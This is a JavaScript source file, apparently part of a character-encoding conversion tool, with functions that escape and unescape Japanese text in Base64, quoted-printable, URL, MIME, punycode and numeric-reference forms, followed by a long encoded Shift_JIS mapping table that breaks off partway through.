function escapeToNumRef(str, base) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var escaped = ''
  var prefix = base == 10 ? ''  : 'x';
  for (var i = 0; i < unicode_codes.length; ++i) {
    var code = unicode_codes[i].toString(base).toUpperCase();
    var num_ref = "&#" + prefix + code + ";"
    escaped += num_ref;
  }
  return escaped;
}

// "あい" => "l8je"
function escapeToPunyCode(str) {
  var unicode_codes = convertStringToPunyCodes(str);
  return convertUnicodeCodePointsToString(unicode_codes);
}

// [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ] => '\xE3\x81\x82\xE3\x81\x84'
// [ 0343, 0201, 0202, 0343, 0201, 0204 ] => '\343\201\202\343\201\204'
function convertBytesToEscapedString(data_bytes, base) {
  var escaped = '';
  for (var i = 0; i < data_bytes.length; ++i) {
    var prefix = (base == 16 ? "\\x" : "\\");
    var num_digits = base == 16 ? 2 : 3;
    var escaped_byte = prefix + formatNumber(data_bytes[i], base, num_digits)
    escaped += escaped_byte;
  }
  return escaped;
}

// "あい" => [0x6C, 0x38, 0x6A, 0x65]  // "l8je"
// Requires: punycode.js should be loaded.
function convertStringToPunyCodes(str) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var puny_codes = [];
  var result = "";
  if (PunyCode.encode(unicode_codes, puny_codes)) {
    return puny_codes;
  }
  return unicode_codes;
}

// [ 0x6C, 0x38, 0x6A, 0x65 ] => "あい"
// Requires: punycode.js should be loaded.
function convertPunyCodesToString(puny_codes) {
  var unicode_codes = [];
  if (PunyCode.decode(puny_codes, unicode_codes)) {
    return convertUnicodeCodePointsToString(unicode_codes);
  }
  return convertUnicodeCodePointsToString(puny_codes);
}

// "あい" => r'\xE3\x81\x82\xE3\x81\x84'  // UTF-8
// "あい" => r'\343\201\202\343\201\204'  // UTF-8
function escapeToEscapedBytes(str, base, encoding) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var data_bytes = convertUnicodeCodePointsToBytes(unicode_codes, encoding);
  return convertBytesToEscapedString(data_bytes, base);
}

// "あい" => "44GC44GE"  // UTF-8
function escapeToBase64(str, encoding) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var data_bytes = convertUnicodeCodePointsToBytes(unicode_codes, encoding);
  return encodeBase64(data_bytes);
}

// "あい" => "=E3=81=82=E3=81=84"  // UTF-8
function escapeToQuotedPrintable(str, encoding) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var data_bytes = convertUnicodeCodePointsToBytes(unicode_codes, encoding);
  return encodeQuotedPrintable(data_bytes);
}

// "あい" => "%E3%81%82%E3%81%84"
function escapeToUrl(str, encoding) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var data_bytes = convertUnicodeCodePointsToBytes(unicode_codes, encoding);
  return encodeUrl(data_bytes);
}

// "あい" => "=?UTF-8?B?44GC44GE?="
// "あい" => "=?UTF-8?Q?=E3=81=82=E3=81=84?="
function escapeToMime(str, mime_encoding, char_encoding) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  var data_bytes = convertUnicodeCodePointsToBytes(unicode_codes,
                                                   char_encoding);
  if (str == "") {
    return "";
  }
  var escaped = "=?" + char_encoding + "?";
  if (mime_encoding == 'base64') {
    escaped += "B?";
    escaped += encodeBase64(data_bytes);
  } else {
    escaped += "Q?";
    escaped += encodeQuotedPrintable(data_bytes);
  }
  escaped += '?=';
  return escaped;
}

// r'\u3042\u3044 => "あい"
function unescapeFromUtf16(str) {
  var utf16_codes = convertEscapedUtf16CodesToUtf16Codes(str);
  return convertUtf16CodesToString(utf16_codes);
}

// r'\U00003042\U00003044 => "あい"
function unescapeFromUtf32(str) {
  var unicode_codes = convertEscapedUtf32CodesToUnicodeCodePoints(str);
  var utf16_codes = convertUnicodeCodePointsToUtf16Codes(unicode_codes);
  return convertUtf16CodesToString(utf16_codes);
}

// r'\xE3\x81\x82\xE3\x81\x84' => "あい"
// r'\343\201\202\343\201\204' => "あい"
function unescapeFromEscapedBytes(str, base, encoding) {
  var data_bytes = convertEscapedBytesToBytes(str, base);
  var unicode_codes = convertBytesToUnicodeCodePoints(data_bytes, encoding);
  return convertUnicodeCodePointsToString(unicode_codes);
}


// "&#12354;&#12356;" => "あい"
// "&#x3042;&#x3044;" => "あい"
function unescapeFromNumRef(str, base) {
  var unicode_codes = convertNumRefToUnicodeCodePoints(str, base);
  return convertUnicodeCodePointsToString(unicode_codes);
}

// "l8je" => "あい"
function unescapeFromPunyCode(str) {
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  return convertPunyCodesToString(unicode_codes);
}

// "44GC44GE" => "あい"
function unescapeFromBase64(str, encoding) {
  var decoded_bytes = decodeBase64(str);
  var unicode_codes = convertBytesToUnicodeCodePoints(decoded_bytes, encoding);
  return convertUnicodeCodePointsToString(unicode_codes);
}

// "=E3=81=82=E3=81=84" => "あい"
function unescapeFromQuotedPrintable(str, encoding) {
  var decoded_bytes = decodeQuotedPrintable(str);
  var unicode_bytes = convertBytesToUnicodeCodePoints(decoded_bytes, encoding);
  return convertUnicodeCodePointsToString(unicode_bytes);
}

// "%E3%81%82%E3%81%84" => "あい"
function unescapeFromUrl(str, encoding) {
  var decoded_bytes = decodeUrl(str);
  var unicode_bytes = convertBytesToUnicodeCodePoints(decoded_bytes, encoding);
  return convertUnicodeCodePointsToString(unicode_bytes);
}

// " " => true
// " \n" => true
function isEmptyOrSequenceOfWhiteSpaces(str) {
  for (var i = 0; i < str.length; ++i) {
    var code = str.charCodeAt(i);
    if (!(code == 0x09 ||   // TAB
          code == 0x0A ||   // LF
          code == 0x0D ||   // CR
          code == 0x20)) {  // SPACE
      return false;
    }
  }
  return true;
}

// "=?UTF-8?B?*?= =?UTF-8?B?*?=" => ["=?UTF-8?B?*?=", "=?UTF-8?B?*?="]
// "=?UTF-8?B?*?=FOO" => ["=?UTF-8?B?*?=", "FOO"]
function splitMimeString(str) {
  var parts = [];
  var current = "";
  while (str != "") {
    var m = str.match(MIME_PARTIAL_MATCH)
    if (m) {
      if (!isEmptyOrSequenceOfWhiteSpaces(current)) {
        parts.push(current);
      }
      current = "";
      parts.push(m[0]);
      str = str.substr(m[0].length);
    } else {
      current += str.charAt(0);
      str = str.substr(1);
    }
  }
  if (!isEmptyOrSequenceOfWhiteSpaces(current)) {
    parts.push(current);
  }
  return parts;
}

// "UTF-8" => "UTF8"
// "Shift_JIS" => "SHIFTJIS"
function normalizeEncodingName(encoding) {
  return encoding.toUpperCase().replace(/[_-]/g, "");
}

// "=?UTF-8?B?44GC44GE?=" => "あい"
// "=?Shift_JIS?B?gqCCog==?=" => "あい"
// "=?ISO-2022-JP?B?GyRCJCIkJBsoQg==?=" => "あい"
// "=?UTF-8?Q?=E3=81=82=E3=81=84?=" => "あい"
// "=?Shift_JIS?Q?=82=A0=82=A2?=" => "あい"
// "=?ISO-2022-JP?Q?=1B$B$"$$=1B(B?=" => "あい"
function unescapeFromMime(str) {
  var parts = splitMimeString(str);
  var unescaped = "";
  for (var i = 0; i < parts.length; ++i) {
    if (isMimeEncodedString(parts[i])) {
      var pair = decodeMime(parts[i]);
      if (pair.length == 0) {  // Malformed MIME string.  Skip it.
        continue;
      }
      var encoding = normalizeEncodingName(pair[0]);
      var data_bytes = pair[1];
      var unicode_codes = convertBytesToUnicodeCodePoints(data_bytes,
                                                          encoding);
      unescaped += convertUnicodeCodePointsToString(unicode_codes);
    } else {
      unescaped += parts[i];
    }
  }
  return unescaped;
}

// Generated from http://source.icu-project.org/repos/icu/data/trunk/charset/data/ucm/ibm-943_P15A-2003.ucm
var SJIS_MAP_ENCODED = {};
SJIS_MAP_ENCODED['ROUNDTRIP'] = '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grgwWoK5MFuCujBcgrswXYK8MF6CvTBfgr4wYIK/MGGCwDBigsEwY4LCMGSCwzBlgsQwZoLFMGeCxjBogscwaYLIMGqCyTBrgsowbILLMG2CzDBugs0wb4LOMHCCzzBxgtAwcoLRMHOC0jB0gtMwdYLUMHaC1TB3gtYweILXMHmC2DB6gtkwe4LaMHyC2zB9gtwwfoLdMH+C3jCAgt8wgYLgMIKC4TCDguIwhILjMIWC5DCGguUwh4LmMIiC5zCJgugwioLpMIuC6jCMguswjYLsMI6C7TCPgu4wkILvMJGC8DCSgvEwk4FKMJuBSzCcgVQwnYFVMJ6DQDChg0EwooNCMKODQzCkg0QwpYNFMKaDRjCng0cwqINIMKmDSTCqg0owq4NLMKyDTDCtg00wroNOMK+DTzCwg1AwsYNRMLKDUjCzg1MwtINUMLWDVTC2g1Ywt4NXMLiDWDC5g1kwuoNaMLuDWzC8g1wwvYNdML6DXjC/g18wwINgMMGDYTDCg2Iww4NjMMSDZDDFg2UwxoNmMMeDZzDIg2gwyYNpMMqDajDLg2swzINsMM2DbTDOg24wz4NvMNCDcDDRg3Ew0oNyMNODczDUg3Qw1YN1MNaDdjDXg3cw2IN4MNmDeTDag3ow24N7MNyDfDDdg30w3oN+MN+DgDDgg4Ew4YOCMOKDgzDjg4Qw5IOFMOWDhjDmg4cw54OIMOiDiTDpg4ow6oOLMOuDjDDsg40w7YOOMO6DjzDvg5Aw8IORMPGDkjDyg5Mw84OUMPSDlTD1g5Yw9oFFMPuBWzD8gVIw/YFTMP6HijIxh4syMoeMMjmHhTKkh4YypYeHMqaHiDKnh4kyqIdlMwOHaTMNh2AzFIdjMxiHYTMih2szI4dqMyaHZDMnh2wzK4dmMzaHbjM7h18zSYdtM0qHYjNNh2czUYdoM1eHfjN7h48zfIeOM32HjTN+h3IzjodzM4+HbzOch3AznYdxM56HdTOhh3QzxIeDM82I6k4AkppOAY61TgOWnE4Hj+ROCI5PTgmP404KibpOC5VzTg2XXk4OmKBOEIlOThGKjk4UmKFOFZCiThaZwE4Xi3VOGJW4ThmP5U4el7xOIZXATib6aE4omKJOKpKGTi2Yo04xi/hOMpikTjaK2044kk9OOY7lTjuYpU48mKZOP5inTkKUVE5Di3ZORZRWTkuT4U5NjMFOTpZSTk/laE5VmKhOVo/mTleYqU5YibNOWYvjTl2M7k5eludOX5ukTmKXkE5xk/tOc4qjTn6LVE6AmKpOgpirToWXuU6Gl1xOiJGITomYrU6KjpZOi5PxToyYsE6OiV1OkYzdTpKM3E6UiOROlZhqTpiYaU6ZjbFOm4ifTpyYsU6emLJOn5izTqCWU06hmLROoozwTqSI5U6llpJOpoucTqiLnU6ri55OrJLgTq2Xuk6umLVOsJi2TrOYt062kGxOuo9ZTsCQbU7BmLxOwpi6TsSYu07Gi3dOx42hTsqJ7k7LmLlOzZi4Ts6Vp07PjmVO1I5kTtWRvE7WmL1O15V0TtiQ5U7ZgVdO3Zi+Tt6YwE7f+mlO4ZHjTuOX307kiMhO5Zi/Tu2JvE7ui8JO8JKHTvKMj072mMFO95RDTvv6ak78+mtPAIrpTwH6bE8DmMJPCYjJTwqM3k8NiupPDpWaTw+UsE8Qi3hPEYnvTxqY5U8ck2BPHZSMTy+YxE8wlLpPNJfgTzaQTE84+m1POY5mTzqOl088ib5PPZLPT0OSQU9GmMhPR4jKT02S4U9Oj1pPT42yT1CXQ09RkcxPU4m9T1X6bk9WmMdPV5ddT1mYw09amMVPW43sT1yYxk9dm0NPXpjOT2mY0U9vmM9PcInAT3OVuU91mMlPdpjNT3uM8U98jmdPf4qkT4OY0k+GmMpPiPpwT4qX4U+LjphPjZjLT4+Y0E+R+m9PkvpyT5SY00+WmMxPmPpxT5qLn0+biMtPnYugT6CJv0+hm0RPq5aZT62Vjk+ujPJPr5BOT7WXtU+2ldZPv4xXT8KRo0/DieJPxPphT8mPck/K+nNPzZjXT86Y3E/QmNpP0ZjVT9SRrU/XmNhP2JjbT9qY2U/bldtP3ZjWT9+QTU/hlpNP45jdT+SY3k/lj0NP7pjrT++Ub0/zlVVP9ZjmT/aV7k/4ibRP+pjqT/76dk//mORQBZjtUAaRcVAJjMJQC5R7UA3gxVAPmOxQEZN8UBKY4VAUjPRQFozzUBmY31Aa+ndQHo7YUB+Y51Ah+nVQIpXtUCOSbFAkmONQJYyRUCaY4FAomOhQKZjiUCqXz1ArmOlQLJhgUC2L5FA2jJBQOfp0UED6elBCmO5QQ/p4UEaY71BHmPNQSIjMUEmVzlBPmPJQUJjxUFWY9VBWmPRQWpLiUFyMklBlmPZQbPp5UHCOw1BykaRQdJLjUHWL9FB2mPdQeItVUH2Y+FCAmPpQhZZUUI2MhlCR+ntQlI5QUJiU9VCZmPlQmo3DUKyXYlCtmPxQsplCULOY+1C0jcJQtY+dULeMWFC+mUNQwovNUMWZQFDJmUFQypOtUM2RnFDPi6FQ0ZZsUNWZRFDW+n1Q2Je7UNqZRVDemUhQ45lGUOWRbVDnmUdQ7ZlJUO76fFD0mUtQ9ZlKUPmVxlD7i1ZRAJlNUQGZTlECia1RBJlMUQmO8lESmVFRFJlQURWZT1EWmNRRGJlSURqPnlEfmVNRIZdEUSqW11EymVVRN5lUUTqZV1E7mVZRPJlYUT+ZWVFAiPJRQYyzUUOMWlFEj1tRRZKbUUaLolFHkOZRSIz1UUn6flFKjY5RS5lbUUyWxlFNk2VRTo6ZUVCZWlFSmVxRVJN9UVqKlVFcmV1RYvqAUWST/FFlkVNRaJlfUWmZYFFqlKpRa4z2UWyYWlFtmWFRboukUXGVulF1kbRRdovvUXeTVFF4jJNRfJliUYCZY1GCk+BRhYl+UYaZZlGJjftRipllUYyNxFGNmWdRj+PsUZCZaFGRlmBRkplpUZOZalGVmWtRlo/nUZeOylGZ+oFRnYqlUaCZblGimWxRpJa7UaWZbVGmlXlRqJlvUamZcFGqmXFRq5N+UayZdVGwmXNRsZl0UbKZclGzjeFRtJl2UbWW6FG2l+JRt5l3Ub36glG+kKZRxJl4UcWPeVHGmXlRyZKcUcuXvVHMk4BRzZnDUdaZelHb6qNR3IvDUd2Ze1Hgln1R4Y+IUeaR+lHnmX1R6ZPiUer6g1HsmX5R7ZmAUfCKTVHxmYFR9YulUfaTylH4iZpR+Y9vUfqUn1H9mYJR/pOBUgCQblIDmYNSBJWqUgaQ2FIHiqBSCIqnUgqZhFILmYZSDoxZUhGZhVIU+oRSFZfxUhePiVIdlLtSJJXKUiWZh1Inl5hSKZmIUiqZiVIuk55SMJmKUjOQp1I2jfxSN4yUUjiZi1I5jmhSOo2PUjuS5FJDmY1SRJGlUkeN7VJKmY5SS5mPUkyRT1JNmYxST5mRUlSWVVJWjYRSW5mQUl6MlVJjjdxSZJSNUmWZlFJpmZJSapWbUm+P6FJwmZtScYqEUnKZlVJzmZNSdJFuUnWZl1J9mZZSf4pjUoOMgFKHmZxSiJerUomZmFKNmZ1SkZmaUpKZmVKUl81Sm/qFUpyM91KficFSoJfyUqP6hlKmj5VSqZN3UqqNhVKrmaBSrJmhUq37d1Kvl+NSsZhKUrSZo1K1jPhSuZmiUryKTlK++odSwJmkUsGWdVLDkrpSxZdFUseV11LJmaVSzejTUtKTrlLVmaZS14qoUtiWsVLZ+ohS24+fUt2Zp1LeleVS35mrUuCQqFLimahS44vOUuSZqVLmiqlS54xNUvKZrFLzma1S9ZmuUviZr1L5jtlS+oz5Uv6W3FL/+olTAJbmUwGT9VMCle9TBZmwUwb6ilMHmbFTCJmzUw2ZtVMPmbRTEJm2UxWJu1MWlmtTF436UxmZt1MakXhTHY+gUyCLp1MhmbhTI/qLUySU2VMqmblTL5m6UzGZu1MzmbxTOJVDUzmL5lM6iONTO5O9Uz+ZvVNAj1xTQZDnU0OZv1NFmb5TRo+hU0eM31NImcFTSZS8U0qZwlNNlNpTUZGyU1KR7FNTi6ZTVJPsU1eSUFNYlI5TWpZtU1yZxFNekOhTYIxUU2aZxVNpmcZTbolLU2+I81NwiutTcfqMU3KRplNzi3BTdJeRU3WZyVN3ibVTeJnIU3uLqFN/mcpTgpbvU4T6jVOTmctTlpfQU5iM+lOajLRTn5nMU6CZzlOlmc1TppB+U6iJWFOpiX1TrZnPU66Z0FOw+o5Tsoy1U7OZ0VO2i45Tu45RU8KZ0lPDlpRTyI2zU8mLeVPKl0ZTy5FvU8yUvVPNjvtTzo9mU9SO5lPWjvNT14+WU9mUvlPb+o9T3ZnVU9+JYlPhkXBT4oz7U+OMw1Pki+VT5ZnZU+iSQFPpkfxT6oupU+uPolPsmdpT7ZnYU+6JwlPvkeRT8I62U/GOalPyiUVT84qQU/aNhlP3jmlT+JnbU/qZ3FQBi2hUA4plVASNh1QIi2dUCZLdVAqJRFQLk69UDJa8VA2NQFQOl5lUD5NmVBCM/FQRjE5UG5nlVB2L4VQflmlUIJTbVCaZ5FQpitxUK5nfVCyZ4FQtmeJULpnjVDaLelQ4kIFUOZWrVDuZ4VQ8md1UPYzhVD6Z3lRAmENUQpXwVEaS5lRIjOBUSY2QVEqZ5lROk9tUUZnqVF+O/FRojvRUapntVHCZ61RxlqFUc5noVHWZ8VR2mexUd5nvVHuMxFR8lr1UfZnwVICZ8lSEmfRUhvqSVIqN7lSLmGFUjJnpVI6Z51SPmfNUkJnuVJL6kVScmfZUoppCVKSZ+FSlmfxUqPqTVKmaQFSrmflUrJpdVK+N51SyilBUs5n3VLiaRFS8iPRUvZpDVL6Io1TAlWlUwZpBVMKZ+lTEmfVUx5n7VMiNxlTJmkVU2Ij1VOGaTlTimkZU5ZpHVOaPo1TololU6ZpMVO2aS1Tuk05U8ppNVPqaSlT9+pRU/4lTVQSNtFUGkE9VB5pIVQ+TglUQmklVFIigVRaaU1Uul0JVL4+lVTGaWVUzmlhVOJpPVTmRwVU+mlBVQJHtVUSaVVVFj6RVRppSVUyW4lVPjFtVU5pWVVaaV1VXmlRVXJpaVV2aUVVjmmBVe5plVXyaYVV+mlxVgJpmVYORUFWE+pVVhppoVYeNQVWJml5VipKdVYuaYlWYmltVmYqrVZqK7FWcioVVnZpjVZ6aX1WfjJZVp5ppVaiaZ1WpkXJVqotpVauLqlWsmmRVrovyVbCJY1W2mm1VxJprVcWapVXHmnBV1JpqVdqablXcmmxV345rVeOab1XkmnJV95p3VfmadVX9mnRV/pJRVgaJw1YJmnFWFJpzVhaPplYXiVJWGJp2VhuJ3FYpmoJWL4/6VjGafVYymntWNJp8VjaaflY4iVxWQpFYVkyaeFZOmnlWUIqaVluagVZkiu1WaJqEVmqagFZrmoNWbJWsVnST01Z4lLZWepqGVoCahVaGimRWh5qHVoqailaPmolWlJqIVqCUWFaimotWpZqMVq6ajla0mo1WtpqQVryak1bAmpFWwZqPVsKaklbDmpRWyJqVVs6allbRmpdW05qYVteZZFbYjvpW2o5sVtuJ8VbeiPZW4JJjVuOamVbujaJW8IjNVvKQfVbzmppW+YzFVvqNkVb9mpxW/5qbVwCV3lcDmp1XBJqfVwianlcJmqBXC5qhVw2Ml1cPiYBXEpqiVxOapFcWmqNXGJqmVxyTeVcfmqdXJoizVyeN3VcojFxXLZJuVzCaqFc3mqlXOJqrVzuarFdAjeJXQovPV0eWVldKmqpXTpqtV0+Nv1dQjUJXUfqWV1masVdhjaNXZPqXV2WSUldmmq5XaZLYV2qasld/kIJXgpqwV4ias1eJjF5Xi5q0V5OatVegjUNXoopfV6Oat1ekmrhXqvqYV6yauVewmrZXs5qvV8CaulfDmrtXxvqaV8f6mVfIloRXy4/pV86avVfSmr5X05q8V9SawFfWlFdX3IjmV9+VdVfgmsFX44/7V/SOt1f3lHxX+YruV/qN6Vf8lnhYAJOwWAKMmFgFkc1YBpq/WAqawlgLkcJYFZrDWBmaxFgdmsZYIZLnWCSKrFgq6p9YL4mBWDCV8Vgxj+pYNJNnWDWN5Fg6msxYPZW7WECX21hBifJYSprIWEuRWVhRmstYUpODWFSTaFhXk4RYWJS3WFmSy1hajcdYXprHWGKJllhpk1VYa5rJWHCaxVhykG9YdZrNWHmPbVh+i6tYg5rOWIWV5liTkZ1Yl5LEWJz6nViemtBYn5ZuWKia0VirmtZYrvqeWLKVrVizmtVYuJrPWLma0li6mtRYu42kWL6Vx1jBmtdYxZJkWMeJ81jKj+tYzJrZWNGa2FjTjYhY1ZraWNea3FjYmttY2ZreWNya01jemuBY35rfWOSa3Vjljm1Y65BwWOyRc1jumuFY75C6WPCI61jxlIRY8pLZWPea41j5muJY+prkWPua5Vj8muZY/ZrnWQKVz1kJmuhZCvqfWQuJxFkPmulZEJdbWRWKT1kWmcdZGI9nWRmRvVkamupZG5bpWRyWslkimuxZJZHlWSeTVlkpkb5ZKpV2WSua7Vksmu5ZLYmbWS6OuFkxmu9ZMojOWTea8Fk4mvFZPomCWUSK71lHk95ZSJXyWUma9VlOkXRZT5r0WVCMX1lR+qBZU5Z6WVSa81lVk4VZV5r3WVia9lla+qFZW/qiWV2a+VlgmvhZYvqjWWOJnFllmvpZZ4+nWWia/FlpkkRZapr7WWyVsVluj5dZc5N6WXSbQFl4jURZfZtBWYGUQFmClNxZg5bPWYSURFmKm0pZjYtXWZOXZFmWlq1ZmZuqWZubQlmdm0VZo/qkWaSRw1mllldZqJNpWaybRlmyloVZufqlWbqNyFm7j6hZvptHWcaOb1nJjm5Zy4i3WdCMxlnRkKlZ04jPWdSbS1nZm0xZ2ptJWdyJV1nliq1Z5ptIWeiWw1nqlVBZ64imWfaI91n7jnBZ/4jQWgGIoVoDm1FaCZtPWhGWuloYm1JaGptQWhybTlofkFBaIJtNWiWV2FopjOJaL5tWWjWbV1o2j6laPJtTWkCYS1pBlGtaRptVWkmNpVpam1haYpV3WmabWVpqm1RabJa5Wn+UfVqSm1pampVRWpubW1q8m19avZtcWr6JxVrBm15awo65WsmbXVrLjJlazJtrWtCbZFrWm2Fa15KEWuGbYFrjm2Ja5ptjWumbZVr6m2Za+4rwWwmbaFsLm2dbDJtpWxaP7Fsim2xbKpLaWyyJZFswm2pbMpttWzabbls+m3FbQJtvW0ObcFtFjnFbUJtyW1GNRVtUm3NbVfqmW1aOmltXkbZbWJt0W1qbdVtbjnlbXI1GW12W0Ftfi0dbY4zHW2SbdltlindbZpt3W2mRt1trm3hbcJuhW3GbeVtzm3pbdZt7W3ibfVt6m35bgJuAW4OR7luFiUZbh47nW4iIwFuJkXZbi4quW4yOs1uNjUdbj5OGW5WPQFuXiq9bmJKIW5mS6FuaiLZbm4tYW5yV81udjsBbn4txW6KQ6VujjrpbpJdHW6WbgVumi3tbro3JW7CKUVuziYNbtI+qW7WJxlu2m4JbuJdlW7mPaFu/+qdbwI7iW8Kbg1vDivFbxJPQW8WWp1vGm4Rbx5uFW8mVeFvMm4db0IqmW9KL9VvTm4Zb1PqpW9iKsFvbkFFb3ZuLW96OQFvficdb4ZuKW+KbiFvkm4xb5ZuJW+aUSlvnnstb6JBSW+mbjVvr+qpb7Je+W+6bjlvwm5Bb85KeW/Wbj1v2kKFb+I6bW/qRzlv+jvVb/5WVXAGQ6lwCjstcBJuRXAWPq1wGm5JcB5uTXAiI0VwJkbhcCpBxXAublFwNk7FcDo+sXA+PrVwRm5VcE5DrXBaPrlwa+qtcHpuWXCCbl1wilt5cJJuYXCiLxFwtj0FcMZuZXDibmlw5jtpcOpBLXDuT8lw8kHNcPZT2XD6UQVw/i8dcQJubXEGLj1xFm5xcRov8XEiTzVxKia5cS45yXE2bnVxOm6BcT5ufXFCL+1xRm55cU5NXXFWRrlxek2pcYI7GXGGRd1xkl5pcZZuiXGybo1xuk9Rcb45SXHGbpVx2m6ZceZunXIyK8lyQm6hckZupXJSJqlyh+qxcppFaXKiK4lypm6tcq5amXKyR0Fyxinhcs5utXLabr1y3it1cuPqtXLqbrFy7m65cvJuxXL6bsFzFm7Jcx5uzXNmTu1zgi6xc4YnjXOibtFzpm7lc6pu3XO2V9VzvlfRc8PquXPWTh1z2m7Zc+o9zXPubtVz9kJJdB5u6XQuN6F0Om8BdEZvBXRSbu10VilJdFpu8XRebxV0Ym8RdGZvDXRqbv10bm75dH5vCXSL6r10nlfZdKfqyXUKbyV1Lm8ZdTJvIXU6Xkl1Qm8ddUvqwXVObvV1ckJNdaZvKXWz6s11tjbVdb5vLXXObzF12m89dgpvOXYSbzV2Hk4hdi5u4XYyb1V2Qm9FdnZvQXaKb0l2sm9NdrpvWXbf6tF24+rVduZfkXbqb1128m9RdvZvYXcmK3l3Mm9ldzfq2XdCb213Sm9pd05vcXdab3V3bkOxd3Y9CXd6PhF3hkYNd441IXeWNtl3mjUld54uQXeib3l3rjbdd7ozIXfGb313ylqRd85RiXfSb4F31jUpd94qqXfuSRl39i9Bd/o5zXgKVel4DlL9eBpvhXguK814Mm+ReEZKfXhab414Zm+JeGpvlXhuS6V4dkINeJY50XiuQyF4tkdFeL4tBXjCSoF4zm+ZeNpvnXjeP7V44llhePZvqXkCb6V5Dm+heRJWdXkWb8V5HlnleTJvrXk6b7V5UloteVZvsXleb7l5flKZeYZvvXmKVvF5jm/BeZIqxXnKVvV5zlE5edJvyXnWb8152jUteeIqyXnmb9F56jLZee5djXnyXSF59ivRefpv2Xn+SoV6BjUxeg4+vXoSU3V6Hj7Beio+YXo+S6l6VlfdelpNYXpeNTV6alXtenJv3XqCTeF6mjcBep4zJXquS616tiMFetY+OXraNTl63l2ZeuJv4XsGb+V7ClHBew5v6XsiX9V7JmExeypv8Xs+b+17QimZe05xAXtacQ17anERe25xCXt2VX17fj7Fe4JxGXuGcRV7inEFe45xHXuicSF7pnEle7JxMXvCcSl7xnEte85xNXvSJhF72kuxe95xOXviMml76ifRe+5RVXvy